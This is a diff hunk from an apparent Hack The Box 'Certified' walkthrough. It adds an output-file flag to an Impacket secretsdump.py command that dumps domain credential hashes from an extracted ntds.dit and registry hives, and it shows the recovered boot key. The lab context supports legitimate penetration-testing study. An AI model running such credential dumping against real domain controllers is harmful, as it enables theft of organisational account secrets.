@@ -1151,7 +1151,7 @@ NTDSUTIL    DC01.certified.htb 445    DC01             [*] secretsdump.py -syste
 
 ```bash
 ┌──(bravosec㉿fsociety)-[~/htb/Certified]
-└─$ secretsdump.py -system '/home/kali/htb/Certified/nxc_ntds/registry/SYSTEM' -security '/home/kali/htb/Certified/nxc_ntds/registry/SECURITY' -ntds '/home/kali/htb/Certified/nxc_ntds/Active Directory/ntds.dit' LOCAL
+└─$ secretsdump.py -system '/home/kali/htb/Certified/nxc_ntds/registry/SYSTEM' -security '/home/kali/htb/Certified/nxc_ntds/registry/SECURITY' -ntds '/home/kali/htb/Certified/nxc_ntds/Active Directory/ntds.dit' LOCAL -outputfile secretsdump
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
 [*] Target system bootKey: 0xdc429b6cbafdcc74c2c3524c029f3844
